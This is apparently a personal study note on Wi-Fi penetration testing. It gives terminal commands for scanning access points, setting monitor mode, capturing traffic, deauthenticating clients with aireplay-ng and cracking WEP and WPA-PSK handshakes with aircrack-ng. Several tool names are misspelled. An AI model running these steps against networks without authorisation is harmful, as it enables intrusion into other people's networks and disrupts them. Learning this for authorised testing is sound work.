# chapter 1: recon
# tooling
	- rfkill: Tool for enabling and disabling wireless and bluetooth devices.
	- iwlist: tool for scan access point
	- wpa_supplicant: tool for connect to access point trought the terminal
	- wpa_passphrase: tool for creating config file for wpa_supplicant
	- ifconfig: manage network iface
	- iwconfig: similar to ifconfig but only for wireless
	- network-manager: service that manage all iface connection. to scan well the air, we need to kill it ``bash  sudo service network-namager stop ``  

1: kill the netwoork-manager to avoid trouble
	$ sudo service network-manager stop
2: scan the air to see access points
```bash
	$ sudo iwlist wlan0 scan
	$ sudo iwlist wlan0 scan | grep ESSID # show only access point name
	$ sudo iwlist wlan0 scan | grep Address # show only the mac address
	$ sudo iwlist wlan0 scan | grep -i --color "ESSID\|Address" # get AP name and Mac address
```	
# information that we can get by scanning AP are:
 	- ESSID: access point name
	- Address: Routeur Mac Address
	- BSSID: access point mac address
	- encrypt type: type of encryption(WEP, WPA, WPA2, WPS)
	- channel: on which the ap is operating

#note: ESSID mean Extended basic Service Set Identifier also call AP name

3: connect to wifi via a terminal
 	- create configuration file
	$ wpa_passphrase [essid] [passphrase] > wpa.conf
	- now connect to the wifi
	$ wpa_suppliciant -D nl80211 -i wlan0 -c wpa.conf	
	- fast way to do that is by using iwconfig
	$ sudo iwconfig iface essid the_name channel N

# chapter 2: attack AP
	
	# differente attack
		- Jam the AP
		- disconnect legitimate client 
		- crack the ap secret
		- create fake AP and make clients connect to it
		- man in Middle
		- arp spoofing
	# encryption type:
		- WEP: Wireless Equivalent Privacy (the all encryption with rc4 algo)
		- WPA: Wifi Protected Acess 2003 year ( TKIP encryption)
		- WPA2: Wifi Protected Acess 2004 year v2(AES encryption)

	# tools
#  Aircrack-ng:
 aircrack-ng is a suit of tool to pentest wireless access point. it contain:
	- airmon-ng
	- airodom-ng
	- aireplay-ng
	- airbase-ng
	- airolib-ng
	- aircrack-ng

# monitor mode
	by default the NIC(Network Interface Card) is in managed mod in order to receive or send packet.
to analyse the trafic of an AP , we need to put your NIC in monitor mod. so we can see all trafic.
in order to do that, we can use airmon-ng
```bash 
	$ sudo airmon-ng check wlan0 # check the mode of the iface
	$ sudo airmon-ng check kill # kill network services. important
	$ sudo airmon-ng start wlan0 # start monitor mode
	$ sudo airmon-ng stop wlan0 # stop monitor mode
	$ iwconf wlan0   # get iface information information 
```

after putting the NIC in monitor mode, you will hae an other iface 'wlan0mon'

# snif the air trafic of wlan0mon iface with airodump
	- sniff the trafic
	- dump the packets into .pcap file
	- get lot of informations
```bash
	$ sudo airodump-ng wlan0mon
```
so we get all the trafig
we can save the trafic with -w switch

# scan trafic for one access point
```bash
	$ sudo airodump-ng --bssid ap_mac --essid ap_name -w file
```
# crack WEP AP
	web is unencrypted and outdate protection.
	nowdays, we will have matter finding wep router. still , let learn the old method
make sur: your NIC is in monitor mod.
in the first terminal:
```bash
	$ sudo airodump-ng --bssid ap_mac -c channel -w capture.pcap
```
in the second terminal:
```bash
 	$ sudo aircrack-ng capture.pcap
```
wait aircrack done the job
# NOTE: more you capture packte(IVs), fast the cracking must be

# WPA-PSK(Wifi Protected Access - Pre-Shared Key)   cracking =:)
	unlike wep, wpa use 4 handshak as  authentification process
# how WPA-PSK 4 handhake work:
	router ==== send Rnonce===> client
	
	client ==== send Cnonce + MIC==> router
	
	router ==== send GTK + MIC ===> client
	
	client ==== Send ACK    =====> router 
	
Rnonce = Routeur nonce
Cnonce = Client nonce
ACK: acknowlgment
GTK: Group Temporal Key
MIC: Message integrity Code 

#step to crack wpa2-psk
- setup nic in monitor mode with airdom-ng or other tool
- get AP bssid, ssid, channel, client bssid
- capture to start capture the traffic with airodump-ng or other tool and save it to a file
- use aireplay-ng to deauthentificate/disconnect one or many clients ``bash $ sudo aireplay-ng --deauth N  -a router_mac -c client_mac  wlan0mon ``
- wait the client to connect
- get  the 4 handhask between routeur and one client
- now that you have the 4 handshak, we can use aircrack-ng and your good dictionnary to crack the password
# the success depend on your password list
``bash  $ sudo aircrack-ng -w wordlist pcap_file
``
